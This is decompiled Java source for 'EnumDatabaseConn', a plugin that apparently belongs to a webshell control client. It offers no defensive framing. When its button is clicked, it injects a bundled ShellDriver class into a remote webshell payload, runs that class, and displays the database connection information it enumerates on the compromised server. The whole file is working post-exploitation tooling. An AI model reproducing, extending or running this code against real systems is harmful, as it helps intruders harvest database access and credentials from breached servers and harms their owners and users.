/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextArea;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="EnumDatabaseConn", DisplayName="\u679a\u4e3e\u6570\u636e\u5e93\u4fe1\u606f")
public class EnumDatabaseConn
implements Plugin {
    private static final String CLASS_NAME = "plugin.ShellDriver";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JButton enumDatabaseConnButton = new JButton("EnumDatabaseConn");
    private boolean loadState;
    private ShellEntity shell;
    private Payload payload;
    private Encoding encoding;
    private final JSplitPane splitPane;
    private final JTextArea resultTextArea = new JTextArea();

    public EnumDatabaseConn() {
        this.splitPane = new JSplitPane();
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.enumDatabaseConnButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.panel.add(this.splitPane);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/ShellDriver.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                } else {
                    Log.log("Load fail", new Object[0]);
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private void enumDatabaseConnButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            this.load();
        }
        if (this.loadState) {
            byte[] result = this.payload.evalFunc(CLASS_NAME, "run", new ReqParameter());
            String resultString = this.encoding.Decoding(result);
            this.resultTextArea.setText(resultString);
        } else {
            Log.error("load EnumDatabaseConn Fail!");
        }
    }

    @Override
    public void init(ShellEntity arg0) {
        this.shell = arg0;
        this.payload = arg0.getPayloadModule();
        this.encoding = Encoding.getEncoding(arg0);
    }
}

